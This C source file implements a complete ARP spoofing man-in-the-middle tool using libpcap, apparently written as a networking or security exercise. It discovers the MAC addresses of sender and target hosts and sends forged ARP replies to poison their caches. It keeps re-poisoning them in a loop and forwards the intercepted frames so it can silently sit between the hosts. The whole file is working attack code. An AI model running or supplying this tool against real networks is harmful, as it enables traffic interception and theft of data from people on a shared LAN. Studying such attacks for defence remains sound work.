#include <arpa/inet.h>      // ntohs
#include <net/if.h>
#include <sys/types.h>      // u_char
#include <sys/socket.h> 
#include <stdint.h>         // uint8_t, uint32_t
#include <stdio.h> 
#include <stdlib.h>
#include <string.h>         // memcpy, memcmp
#include <sys/ioctl.h> 
#include <unistd.h>
#include <pcap.h>
#include "arp_spoof.h"

uint8_t broadcast[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };

int main(int argc, char** argv) { 
    /* check argc */
    if(argc != 4 && argc != 6) {
        printf("usage: %s <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>]\n", argv[0]);
        printf("e.g. : %s wlan0 192.168.0.11 192.168.0.1\n", argv[0]);
        printf("or   : %s wlan0 192.168.0.11 192.168.0.1 192.168.0.1 192.168.0.11\n", argv[0]);
        exit(1);
    }

    uint8_t sender1_ip[4], target1_ip[4], sender2_ip[4], target2_ip[4];
    convert_ip(argv[2], sender1_ip);
    convert_ip(argv[3], target1_ip);
    if(argc == 6) {
        convert_ip(argv[4], sender2_ip);
        convert_ip(argv[5], target2_ip);
    }

    uint8_t intf_mac[6] = { 0, };
    uint8_t sender1_mac[6] = { 0, };
    uint8_t target1_mac[6] = { 0, };
    uint8_t sender2_mac[6] = { 0, };
    uint8_t target2_mac[6] = { 0, };

    /* get interface's MAC address, MTU size */
    int sockfd; 
    int io; 
    char buffer[1024]; 
    struct ifreq ifr;
 
    sprintf(ifr.ifr_name, "%s", argv[1]);

    sockfd = socket(AF_INET, SOCK_STREAM, 0); 
    if(sockfd < 0){ 
        perror("socket"); 
        exit(1); 
    } 
  
    io = ioctl(sockfd, SIOCGIFHWADDR, (char *)&ifr); 
    if(io < 0){ 
        perror("ioctl"); 
        exit(1); 
    } 

    printf("[" ANSI_COLOR_GREEN "*" ANSI_COLOR_RESET "]"" interface %s, hw_addr: %02x:%02x:%02x:%02x:%02x:%02x\n", 
        argv[1],
        (unsigned char)ifr.ifr_ifru.ifru_hwaddr.sa_data[0],
        (unsigned char)ifr.ifr_ifru.ifru_hwaddr.sa_data[1],
        (unsigned char)ifr.ifr_ifru.ifru_hwaddr.sa_data[2],
        (unsigned char)ifr.ifr_ifru.ifru_hwaddr.sa_data[3],
        (unsigned char)ifr.ifr_ifru.ifru_hwaddr.sa_data[4],
        (unsigned char)ifr.ifr_ifru.ifru_hwaddr.sa_data[5]
    ); 
    memcpy(intf_mac, ifr.ifr_ifru.ifru_hwaddr.sa_data, ETH_ALEN);

    io = ioctl(sockfd, SIOCGIFMTU, &ifr);
    if(io < 0) {
        perror("ioctl");
        exit(1);
    }

    // printf("[DEBUG] ifr_mtu: %d\n", ifr.ifr_mtu);

    /* pcap_open_live */
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    // pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 50, errbuf);
    pcap_t* handle = pcap_open_live(dev, ifr.ifr_mtu, 1, 50, errbuf);

    close(sockfd);

    if (handle == NULL) {
        fprintf(stderr, "[" ANSI_COLOR_RED "!" ANSI_COLOR_RESET "] couldn't open device %s: %s\n", dev, errbuf);
        exit(-1);
    }

    uint32_t packet_size = ETH_HLEN + ARP_HLEN;
    unsigned char *packet = (unsigned char*)malloc(sizeof(unsigned char) * packet_size);

    struct pcap_pkthdr* header;
    u_char *pkt;
    int res;   

    /* send ARP request to sender1 */
    make_arp_req(packet, intf_mac, sender1_ip);
    if(pcap_sendpacket(handle, packet, packet_size)) {
        fprintf(stderr, "[" ANSI_COLOR_RED "!" ANSI_COLOR_RESET "] failed to send packet: %s\n", pcap_geterr(handle));
        exit(1);
    }

    /* receive sender1's ARP reply */
    while(1) {
        res = pcap_next_ex(handle, &header, &pkt);
        if(res == 0) continue; 
        if(res == -1 || res == -2) break;

        if(is_arp_reply(pkt, sender1_ip, sender1_mac)) { 
            printf("[" ANSI_COLOR_BLUE "+" ANSI_COLOR_RESET "] received ARP reply: sender1's MAC is %02x:%02x:%02x:%02x:%02x:%02x\n", 
                sender1_mac[0], sender1_mac[1], sender1_mac[2], sender1_mac[3], sender1_mac[4], sender1_mac[5]
            );
            break;
        }
        else continue;
    }

    /* send ARP request to target1 */
    make_arp_req(packet, intf_mac, target1_ip);
    if(pcap_sendpacket(handle, packet, packet_size)) {
        fprintf(stderr, "[" ANSI_COLOR_RED "!" ANSI_COLOR_RESET "] failed to send packet: %s\n", pcap_geterr(handle));
        exit(1);
    }

    /* receive target1's ARP reply */
    while(1) {
        res = pcap_next_ex(handle, &header, &pkt);
        if(res == 0) continue; 
        if(res == -1 || res == -2) break;

        if(is_arp_reply(pkt, target1_ip, target1_mac)) { 
            printf("[" ANSI_COLOR_BLUE "+" ANSI_COLOR_RESET "] received ARP reply: target1's MAC is %02x:%02x:%02x:%02x:%02x:%02x\n", 
                target1_mac[0], target1_mac[1], target1_mac[2], target1_mac[3], target1_mac[4], target1_mac[5]
            );
            break;
        }
        else continue;
    }

    /* (opt) send request to sender2, target2 and receive reply */
    if(argc == 6) {
        make_arp_req(packet, intf_mac, sender2_ip);
        if(pcap_sendpacket(handle, packet, packet_size)) {
            fprintf(stderr, "[" ANSI_COLOR_RED "!" ANSI_COLOR_RESET "] failed to send packet: %s\n", pcap_geterr(handle));
            exit(1);
        }

        while(1) {
            res = pcap_next_ex(handle, &header, &pkt);
            if(res == 0) continue; 
            if(res == -1 || res == -2) break;

            if(is_arp_reply(pkt, sender2_ip, sender2_mac)) { 
                printf("[" ANSI_COLOR_BLUE "+" ANSI_COLOR_RESET "] received ARP reply: sender2's MAC is %02x:%02x:%02x:%02x:%02x:%02x\n", 
                    sender2_mac[0], sender2_mac[1], sender2_mac[2], sender2_mac[3], sender2_mac[4], sender2_mac[5]
                );
                break;
            }
            else continue;
        }

        make_arp_req(packet, intf_mac, target2_ip);
        if(pcap_sendpacket(handle, packet, packet_size)) {
            fprintf(stderr, "[" ANSI_COLOR_RED "!" ANSI_COLOR_RESET "] failed to send packet: %s\n", pcap_geterr(handle));
            exit(1);
        }

        while(1) {
            res = pcap_next_ex(handle, &header, &pkt);
            if(res == 0) continue; 
            if(res == -1 || res == -2) break;

            if(is_arp_reply(pkt, target2_ip, target2_mac)) { 
                printf("[" ANSI_COLOR_BLUE "+" ANSI_COLOR_RESET "] received ARP reply: target2's MAC is %02x:%02x:%02x:%02x:%02x:%02x\n", 
                    target2_mac[0], target2_mac[1], target2_mac[2], target2_mac[3], target2_mac[4], target2_mac[5]
                );
                break;
            }
            else continue;
        }
    }

    /* send reply to sender1 */
    make_arp_rep(packet, intf_mac, target1_ip, sender1_mac, sender1_ip);
    send_packet_mul(handle, packet, packet_size);

    /* (opt) send reply to sender2 */
    if(argc == 6) {
        make_arp_rep(packet, intf_mac, target2_ip, sender2_mac, sender2_ip);
        send_packet_mul(handle, packet, packet_size);
    }

    printf("[" ANSI_COLOR_GREEN "*" ANSI_COLOR_RESET "] phase1 complete! switching to phase 2.\n");

    /* /////////// */
    while(1) {
        res = pcap_next_ex(handle, &header, &pkt);
        if(res == 0) continue;
        if(res == -1 || res == -2) break;

        if(is_arp_request(pkt, sender1_mac, target1_ip)) {
            /* send ARP reply */
            make_arp_rep(packet, intf_mac, target1_ip, sender1_mac, sender1_ip);
            send_packet_mul(handle, packet, packet_size);
            continue;
        }
        else {
            /* does pkt need routing? */
            if(is_routing_needed(pkt, sender1_mac, intf_mac)) {
                change_eth_hdr(pkt, intf_mac, target1_mac);
                if(pcap_sendpacket(handle, pkt, header->caplen)) {
                    fprintf(stderr, "[" ANSI_COLOR_RED "!" ANSI_COLOR_RESET "] failed to send packet: %s\n", pcap_geterr(handle));
                    exit(1);
                }
                continue;
            }
        }

        if(argc == 6) {
            if(is_arp_request(pkt, sender2_mac, target2_ip)) {
                /* send ARP reply */
                make_arp_rep(packet, intf_mac, target2_ip, sender2_mac, sender2_ip);
                send_packet_mul(handle, packet, packet_size);
                continue;
            }
            else {
                /* does pkt need routing? */
                if(is_routing_needed(pkt, sender2_mac, intf_mac)) {
                    change_eth_hdr(pkt, intf_mac, target2_mac);
                    if(pcap_sendpacket(handle, pkt, header->caplen)) {
                        fprintf(stderr, "[" ANSI_COLOR_RED "!" ANSI_COLOR_RESET "] failed to send packet: %s\n", pcap_geterr(handle));
                        fprintf(stderr, "[DEBUG] header->caplen %u, header->len %u\n", header->caplen, header->len);
                        exit(1);
                    }
                    continue;
                }
            }
        }
    }

    pcap_close(handle);
    exit(0);
}

void convert_ip(u_char* in, uint8_t* out) {
    sscanf(in, "%u.%u.%u.%u", &out[0], &out[1], &out[2], &out[3]);
}

void make_arp_req(unsigned char* packet, uint8_t* snd_mac, uint8_t* tgt_ip) {
    struct eth_header *eth = (struct eth_header*)packet;
    memcpy(eth->mac_dest, broadcast, ETH_ALEN);
    memcpy(eth->mac_src, snd_mac, ETH_ALEN);
    eth->etherType = htons(ETH_TYPE_ARP);

    struct arp_header *arp = (struct arp_header*)(packet + ETH_HLEN);
    arp->hw_type = htons(ARP_HTYPE_ETH);
    arp->pro_type = htons(ARP_PTYPE_IPV4);
    arp->halen = ARP_HALEN;
    arp->palen = ARP_PALEN;
    arp->opcode = htons(ARP_OPCODE_REQ);
    memcpy(arp->sender_hw, snd_mac, ARP_HALEN);
    // memcpy(arp->sender_pr, NULL, 0); // sender ip address isn't necessary for ARP operation
    memcpy(arp->target_hw, broadcast, ARP_HALEN);
    memcpy(arp->target_pr, tgt_ip, ARP_PALEN);
}

void make_arp_rep(unsigned char* packet, uint8_t* snd_mac, uint8_t* snd_ip, uint8_t* tgt_mac, uint8_t* tgt_ip) {
    struct eth_header *eth = (struct eth_header*)packet;
    memcpy(eth->mac_dest, tgt_mac, ETH_ALEN);
    memcpy(eth->mac_src, snd_mac, ETH_ALEN);
    eth->etherType = htons(ETH_TYPE_ARP);

    struct arp_header *arp = (struct arp_header*)(packet + ETH_HLEN);
    arp->hw_type = htons(ARP_HTYPE_ETH);
    arp->pro_type = htons(ARP_PTYPE_IPV4);
    arp->halen = ARP_HALEN;
    arp->palen = ARP_PALEN;
    arp->opcode = htons(ARP_OPCODE_REP);
    memcpy(arp->sender_hw, snd_mac, ARP_HALEN);
    memcpy(arp->sender_pr, snd_ip, ARP_PALEN);
    memcpy(arp->target_hw, tgt_mac, ARP_HALEN);
    memcpy(arp->target_pr, tgt_ip, ARP_PALEN);
}

int is_arp_request(const u_char* pkt, uint8_t* src_mac, uint8_t* tgt_ip) {
    // printf("[DEBUG] is_arp_request\n");
    struct eth_header *eth = (struct eth_header*)pkt;
    pkt += ETH_HLEN;

    // printf("\teth->mac_src is %02x:%02x:%02x:%02x:%02x:%02x\n", eth->mac_src[0], eth->mac_src[1], eth->mac_src[2], eth->mac_src[3], eth->mac_src[4], eth->mac_src[5]);
    if(memcmp(eth->mac_src, src_mac, ETH_ALEN) != 0) return 0;
    // printf("\tetherType is 0x%x\n", ntohs(eth->etherType));
    if(ntohs(eth->etherType) != ETH_TYPE_ARP) return 0;
    
    struct arp_header *arp = (struct arp_header*)pkt;
    pkt += ARP_HLEN;

    // printf("\tarp->opcode is %u\n", arp->opcode);
    if(ntohs(arp->opcode) != ARP_OPCODE_REQ) return 0;
    // printf("\tarp->target_protocol_addr is %u.%u.%u.%u\n", arp->target_pr[0], arp->target_pr[1], arp->target_pr[2], arp->target_pr[3]);
    if(memcmp(arp->target_pr, tgt_ip, ARP_PALEN) != 0) return 0;
    else return 1;

    return 0;
}

int is_arp_reply(const u_char* pkt, uint8_t* src_ip, uint8_t* src_mac) {
    struct eth_header *eth = (struct eth_header*)pkt;
    pkt += ETH_HLEN;

    if(ntohs(eth->etherType) != ETH_TYPE_ARP) return 0;

    struct arp_header *arp = (struct arp_header*)pkt;
    pkt += ARP_HLEN;

    if(ntohs(arp->opcode) != ARP_OPCODE_REP) return 0;
    // printf("[DEBUG] arp->sender pr is %u.%u.%u.%u\n", arp->sender_pr[0], arp->sender_pr[1], arp->sender_pr[2], arp->sender_pr[3]);
    if(memcmp(arp->sender_pr, src_ip, ARP_PALEN) != 0) return 0;
    else {
        memcpy(src_mac, arp->sender_hw, ARP_HALEN);
        return 1;
    }

    return 0;
}

int is_routing_needed(const u_char* pkt, uint8_t* src_mac, uint8_t* dst_mac) {
    struct eth_header *eth = (struct eth_header*)pkt;
    pkt += ETH_HLEN;
/*
    printf("[DEBUG] is_routing_needed\n");
    printf("eth->mac_src %02x:%02x:%02x:%02x:%02x:%02x\n", eth->mac_src[0], eth->mac_src[1],eth->mac_src[2],eth->mac_src[3],eth->mac_src[4],eth->mac_src[5]);
    printf("eth->mac_dest %02x:%02x:%02x:%02x:%02x:%02x\n", eth->mac_dest[0], eth->mac_dest[1],eth->mac_dest[2],eth->mac_dest[3],eth->mac_dest[4],eth->mac_dest[5]);
    printf("memcmp: src is %d\n", memcmp(eth->mac_src, src_mac, ETH_ALEN));
    printf("memcmp: dst is %d\n", memcmp(eth->mac_dest, dst_mac, ETH_ALEN));
*/
    if(memcmp(eth->mac_src, src_mac, ETH_ALEN) != 0) return 0;
    if(memcmp(eth->mac_dest, dst_mac, ETH_ALEN) != 0) return 0;

//    printf("[DEBUG] is_routing_needed=" ANSI_COLOR_GREEN "true" ANSI_COLOR_RESET "\n\n");
    return 1;
}

void change_eth_hdr(unsigned char* pkt, uint8_t* src_mac, uint8_t* dst_mac) {
    // change the values according to the original header... 
    struct eth_header *eth = (struct eth_header*)pkt;
    pkt += ETH_HLEN;

    memcpy(eth->mac_dest, dst_mac, ETH_ALEN);
    memcpy(eth->mac_src, src_mac, ETH_ALEN);
}

void send_packet_mul(pcap_t* handle, const u_char* packet, uint32_t packet_size) {
    for(int i = 0; i < RTRSNMT; ++i) {
        if(pcap_sendpacket(handle, packet, packet_size)) {
            fprintf(stderr, "[" ANSI_COLOR_RED "!" ANSI_COLOR_RESET "] failed to send packet: %s", pcap_geterr(handle));
            exit(1);
        }
        usleep(TTS);
    }
}